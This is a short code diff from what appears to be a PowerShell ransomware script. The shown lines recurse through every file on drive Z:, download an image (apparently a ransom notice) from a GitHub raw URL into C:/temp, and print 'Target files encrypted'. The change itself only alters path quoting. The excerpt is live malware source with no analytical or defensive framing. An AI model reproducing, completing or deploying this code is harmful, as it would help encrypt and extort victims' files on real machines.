@@ -292,7 +292,7 @@ foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.
 }
 
 $alert = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/img.png"
-Invoke-WebRequest -Uri $alert -OutFile "C:/temp/img.png"
+Invoke-WebRequest -Uri $alert -OutFile 'c:/temp/img.png'
 # Start-Sleep -s 2
 
 Write-Host "[+] Target files encrypted..." -ForegroundColor Green
